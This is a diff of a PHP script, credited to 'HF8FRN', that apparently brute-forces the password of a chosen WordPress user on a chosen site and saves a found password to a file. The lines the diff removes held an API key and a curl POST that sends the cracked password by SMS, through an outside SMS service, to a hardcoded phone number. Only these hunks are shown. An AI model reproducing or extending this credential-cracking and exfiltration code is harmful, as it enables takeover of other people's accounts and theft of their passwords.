@@ -11,8 +11,6 @@ Autor: HF8FRN
 $username = ""; // Username for which you want to obtain a password
 $domain = ""; // WordPress site domain for which you want to obtain a password
 
-$apiKey = ""; // API key from smsspeed.pl to receive password notification
-
 // Define available characters
 $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?';
 
@@ -76,17 +74,6 @@ while (true) {
         $password_file = fopen("password.txt", "w");
         fwrite($password_file, $password);
         fclose($password_file);
-
-        $message = "SUCCESS!
-
-Password: $password";
-        $sms_ch = curl_init('https://panel.smsspeed.pl/api');
-        curl_setopt($sms_ch, CURLOPT_POST, 1);
-        curl_setopt($sms_ch, CURLOPT_POSTFIELDS,
-        "api=$apiKey&xxt=sms&sender=SYSTEM&to=729664512&message=$message");
-        curl_setopt($sms_ch, CURLOPT_RETURNTRANSFER, true);
-        $sms_out = curl_exec($sms_ch);
-        curl_close($sms_ch);
 
         break;
     } else {
